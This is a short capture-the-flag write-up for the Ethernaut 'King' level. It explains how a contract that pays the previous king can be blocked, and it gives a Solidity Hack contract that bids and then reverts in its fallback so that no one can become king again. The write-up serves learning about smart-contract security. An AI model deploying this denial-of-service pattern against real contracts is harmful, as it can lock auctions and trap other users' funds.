# King Ethernaut

## Goals

=> When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

### Hints

- None

### Solution

- The weakness lies in the transfer funds to the previous king function which will trigger the fallback function in another contract, if we just revert in that fallback function, no new king will be set since we always revert.

- Just deploy the Hack contract with a msg.value >= prize and from now on no one can become the new King.

### Contract

```solidity
contract Hack {
    King king;

    constructor(address _king) payable {
        king = King(payable(_king));
        (bool success, ) = payable(king).call{value: msg.value}("");
        require(success, "bid failed");
    }

    fallback() external {
        revert();
    }
}
```
